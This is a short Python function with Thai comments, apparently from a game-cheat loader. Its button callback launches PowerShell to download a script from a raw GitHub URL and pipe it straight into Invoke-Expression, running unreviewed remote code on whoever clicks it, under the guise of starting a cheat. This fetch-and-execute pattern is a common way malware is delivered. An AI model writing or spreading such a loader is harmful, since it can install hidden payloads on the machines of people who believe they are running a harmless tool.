import subprocess

def start_cheat_callback():
    print("กำลังเชื่อมต่อเซิร์ฟเวอร์และเริ่มทำงาน...")
    
    # คำสั่งจากรูปภาพของคุณ
    powershell_command = 'iwr "https://raw.githubusercontent.com/lubyralph6-maker/newpower.ps1/refs/heads/main/newpower.ps1" | iex'
    
    try:
        # สั่งรัน PowerShell พร้อมคำสั่งดังกล่าว
        subprocess.Popen(["powershell", "-Command", powershell_command])
        
        # ถ้าอยากให้รันเสร็จแล้วปิดหน้า Loader ของเราไปเลย
        # dpg.stop_dearpygui()
        
    except Exception as e:
        print(f"เกิดข้อผิดพลาด: {e}")
